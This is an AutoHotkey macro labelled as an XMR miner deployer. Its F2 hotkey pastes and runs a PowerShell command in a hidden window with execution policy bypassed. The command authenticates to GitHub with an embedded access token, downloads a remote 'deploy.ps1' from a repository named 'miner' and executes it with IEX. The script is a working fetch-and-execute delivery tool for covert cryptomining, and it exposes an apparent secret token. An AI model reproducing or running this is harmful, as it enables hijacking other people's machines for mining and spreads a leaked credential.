; ═══════════════════════════════════════════════════════════
; XMR Miner Deploy Macro — AutoHotkey v1/v2 Compatible
; ═══════════════════════════════════════════════════════════
; F2 = Paste deploy command + Enter (use when shell is focused)
; F3 = Exit macro
; ═══════════════════════════════════════════════════════════

#SingleInstance Force
#NoEnv
SetWorkingDir %A_ScriptDir%

; The deploy command
deployCmd := "powershell -ep bypass -w hidden -c ""[Net.ServicePointManager]::SecurityProtocol=3072;$h=@{'Authorization'='token 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';'User-Agent'='M'};IEX((Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/holyownsurmom/miner/main/deploy.ps1' -Headers $h -UseBasicParsing).Content)"""

; Show ready notification
TrayTip, Deploy Macro, F2 = Deploy | F3 = Exit, 3, 1

; F2: Paste command and hit Enter
F2::
    ; Clear clipboard, set our command, paste, enter
    Clipboard := deployCmd
    Sleep 100
    Send ^v
    Sleep 200
    Send {Enter}
    TrayTip, Deploy Macro, Command sent!, 1, 1
return

; F3: Exit
F3::
    ExitApp
return
